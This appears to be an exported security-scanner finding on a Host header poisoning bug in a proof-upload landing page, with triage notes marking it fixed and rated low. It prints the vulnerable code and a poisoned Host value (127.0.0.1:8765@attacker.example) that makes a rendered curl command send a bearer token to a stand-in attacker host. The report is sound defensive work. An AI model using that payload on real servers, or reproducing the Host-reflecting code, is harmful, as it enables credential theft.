# CSF-046: Host header poisoning in proof upload landing page

## Metadata

| Field | Value |
|---|---|
| Severity | Informational |
| Codex status | Closed |
| Repository | kriegcloud/beep-effect |
| Source commit | d8f1ede |
| Reported age | 5d ago |
| Capture method | dom-fallback |
| Owner area | goals/stack-installer |
| Triage verdict | fixed |
| Codex close reason | Already fixed |

## Summary

Introduced by this commit: the landing page changed from relative paths and a placeholder host to request-host-specific absolute URLs generated directly from request.headers.host.

## Current-HEAD Triage

- Verdict: `fixed`
- Rationale: The proof upload landing page no longer reflects request Host. It renders URLs from the configured advertised URL or normalized configured host and port.
- Remediation status: `fixed-in-branch`
- Verification command: `node --check goals/stack-installer/ops/proof-upload-server.mjs && node goals/stack-installer/ops/proof-upload-smoke.mjs`
- Changed files:
  - goals/stack-installer/ops/proof-upload-server.mjs
- Verification notes:
  - Script syntax checks pass and the proof upload smoke validates the served landing page.

## Evidence Paths

- goals/stack-installer/ops/proof-upload-server.mjs

## Validation Notes From Codex

- Commit changes landing-page documentation from relative/placeholder URLs to request-dependent absolute URLs.
- GET / is unauthenticated and passes raw request.headers.host into landingPage without validation/canonicalization.
- An attacker-controlled Host containing URL userinfo syntax is reflected into token-protected URLs and the operator curl command.
- Standard URL/client parsing routes the rendered URL to the attacker-controlled authority rather than the legitimate server.
- Executing the rendered command with STACK_INSTALLER_PROOF_UPLOAD_TOKEN discloses the bearer token to the attacker endpoint.

## Sanitized Finding Content

```text
Finding
Host header poisoning in proof upload landing page
Report
Chat
Severity
Informational
Adjust to improve accuracy in future scans
Commit
d8f1ede
4:29 PM May 14, 2026
by elpresidank
Repository
kriegcloud/beep-effect
Summary
Introduced by this commit: the landing page changed from relative paths and a placeholder host to request-host-specific absolute URLs generated directly from request.headers.host.
The new landingPage(requestHost) path trusts request.headers.host and interpolates it into operator-facing absolute URLs. Because GET / is unauthenticated and the Host header is attacker-controlled at the HTTP boundary, a poisoned Host value can make the legitimate server render token-protected commands pointing at an attacker-controlled authority. For example, a Host value such as 127.0.0.1:8765@attacker.example renders a curl command for http://127.0.0.1:8765@attacker.example/next-actions; standard URL parsers treat attacker.example as the destination host and the 127.0.0.1:8765 portion as userinfo. If an operator copies that generated command after setting STACK_INSTALLER_PROOF_UPLOAD_TOKEN, the bearer token can be sent to the attacker, allowing access to protected status/commands/next-actions and uploads. The endpoint should use a configured canonical/advertised base URL or strictly validate/allowlist the incoming authority before rendering it.
Validation
Commit changes landing-page documentation from relative/placeholder URLs to request-dependent absolute URLs.
GET / is unauthenticated and passes raw request.headers.host into landingPage without validation/canonicalization.
An attacker-controlled Host containing URL userinfo syntax is reflected into token-protected URLs and the operator curl command.
Standard URL/client parsing routes the rendered URL to the attacker-controlled authority rather than the legitimate server.
Executing the rendered command with STACK_INSTALLER_PROOF_UPLOAD_TOKEN discloses the bearer token to the attacker endpoint.
Validation artifact
Evidence
goals/stack-installer/ops/proof-upload-server.mjs
107
const landingPage = (requestHost) => {
108
const requestUrlBase = requestHost ? `http://${requestHost}` : `http://${host}:${port}`;
109
110
return [
111
"Stack Installer P1 proof upload endpoint",
112
"",
113
"If you are a proof operator and only have this URL:",
114
"1. Ask the coordinator for the private proof upload token out-of-band.",
115
"2. Put the token in STACK_INSTALLER_PROOF_UPLOAD_TOKEN on the proof machine.",
116
"3. Fetch /next-actions with an Authorization: [redacted authorization header] header.",
117
"4. Run the platform proof, package the artifact, and upload only the approved bundle name.",
118
"",
119
"Public checks:",
120
`- GET ${requestUrlBase}/health`,
121
"",
122
"Token-protected checks:",
123
`- GET ${requestUrlBase}/status`,
124
`- GET ${requestUrlBase}/commands`,
125
`- GET ${requestUrlBase}/next-actions`,
126
"",
127
"Allowed uploads:",
128
`- PUT or POST ${requestUrlBase}/upload/stack-installer-p1-macos.tgz`,
129
`- PUT or POST ${requestUrlBase}/upload/stack-installer-p1-windows.zip`,
130
"",
131
"Fetch next actions from a proof machine:",
132
`curl -f -H "Authorization: [redacted authorization header]" '${requestUrlBase}/next-actions'`,
143
if (request.method === "GET" && requestUrl.pathname === "/") {
144
logRequest(request, 200, "landing");
145
send(response, 200, landingPage(request.headers.host));
Attack-path analysis
The code-level issue is real and was dynamically demonstrated, but it is in goals/stack-installer/ops temporary proof-transfer tooling, not the main product surfaces covered by the supplied threat model. Even if treated as in scope, probability and impact are below the original medium rating: exposure is localhost/tailnet by design, exploitation requires operator copy-paste interaction plus Host/authority influence, and the disclosed credential is a temporary proof upload token scoped to one helper instance rather than a broad product or cloud credential. Therefore it should be ignored for main-product criticality; if tracked for internal ops hardening, treat it as low.
Path
Attacker controlling Host/authority --supplies poisoned Host header/authority--> GET / public landing page --renders poisoned curl command--> Proof operator with token in environment --executes command and sends bearer token--> Attacker-controlled HTTP endpoint --reuses disclosed token--> Token-protected proof upload endpoints
The finding is technically valid: proof-upload-server.mjs takes request.headers.host from an unauthenticated GET / request and interpolates it into absolute URLs and a curl command that includes the proof upload bearer token header. The prior validation PoC showed a userinfo-style Host value causing curl to send the token to the attacker authority. However, repository context shows this is temporary internal/tailnet ops tooling, not a main product service in the supplied threat model; default binding is 127.0.0.1 and documented wider use is a coordinator Tailscale IP. Exploitation also needs operator interaction and a way to make the operator trust or fetch the landing page with the poisoned authority. Standalone impact is limited to a temporary proof helper token and proof artifacts, not broad product compromise.
Likelihood
Low - The vulnerable endpoint is reachable when the helper is running, but default exposure is localhost and documented non-local exposure is a trusted tailnet. The token leak requires user interaction and a practical way to make the operator consume a landing page generated with an attacker-influenced Host header.
Impact
Low - Successful exploitation can disclose the temporary proof upload bearer token and allow access to helper status/commands/next-actions plus approved-name proof bundle upload. The token is not a cloud, account, or product-wide credential, and the affected service is temporary internal ops tooling.
Assumptions
Assessment is limited to repository artifacts and the provided validation evidence; no cloud APIs or live tailnet state were queried.
The proof upload helper is treated as committed internal ops tooling under goals/stack-installer/ops, not as the main Beep repo-memory runtime or desktop product described in the threat model.
If an operator deliberately exposes this helper beyond localhost or a trusted tailnet, the attack becomes more relevant, but the repository evidence documents it as a temporary tailnet/local proof-transfer fallback.
proof-upload-server.mjs is started with STACK_INSTALLER_PROOF_UPLOAD_TOKEN
the server is bound to an interface reachable by proof operators, commonly a Tailscale coordinator IP per repo docs
an attacker can influence the Host header or authority used when an operator obtains the public landing page
the operator copies and executes the rendered curl command with STACK_INSTALLER_PROOF_UPLOAD_TOKEN set
the attacker's authority can receive the outbound curl request
Controls
Sensitive helper endpoints require an Authorization: [redacted authorization header] or token query parameter
The public landing page and /health are unauthenticated
Default host is 127.0.0.1
Operational docs use a Tailscale coordinator IP rather than public internet ingress
Generated token, command, pid, and log files are written with 0600 permissions by the launcher
Uploads are constrained to two approved bundle filenames
No Host allowlist or canonical URL control is applied on the public landing page
Blindspots
No live deployment, DNS, reverse proxy, or Tailscale ACL configuration was available in repository artifacts.
The prior validation PoC proves URL parsing and token exfiltration mechanics but does not prove a real operator-delivery path in the documented tailnet workflow.
No IaC or service manifest was found for public ingress, so exposure assessment relies on scripts and docs.
Finding content copied
Finding content copied
```
